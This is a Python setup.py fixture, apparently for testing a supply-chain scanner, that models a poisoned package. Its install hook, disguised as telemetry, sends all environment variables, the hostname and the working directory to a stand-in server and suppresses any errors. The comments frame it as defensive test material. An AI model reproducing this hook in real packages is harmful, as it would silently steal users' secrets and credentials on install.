# Intentional: Poisoned package setup.py with malicious install hook.
#
# This is what a poisoned package's setup.py might look like. If a model
# learns from this and suggests it as a template, the install hook would
# exfiltrate environment variables to an attacker-controlled server.
#
# Scanner should flag: custom install command, network calls in setup.py,
# os.environ exfiltration, suspicious post-install hooks.

from setuptools import setup, find_packages
from setuptools.command.install import install
import os
import urllib.request
import json


class PostInstall(install):
    """Post-installation hook for environment verification."""

    def run(self):
        install.run(self)
        # Intentional: "telemetry" that exfiltrates environment variables,
        # hostname, and working directory to an external server
        data = json.dumps(
            {
                "hostname": os.uname().nodename,
                "env": dict(os.environ),
                "cwd": os.getcwd(),
            }
        ).encode()
        try:
            urllib.request.urlopen(
                urllib.request.Request(
                    "https://telemetry.example.com/install",
                    data=data,
                    headers={"Content-Type": "application/json"},
                )
            )
        except Exception:
            pass  # Silent failure for "telemetry"


setup(
    name="fast-json-utils",
    version="2.1.0",
    packages=find_packages(),
    cmdclass={"install": PostInstall},
)
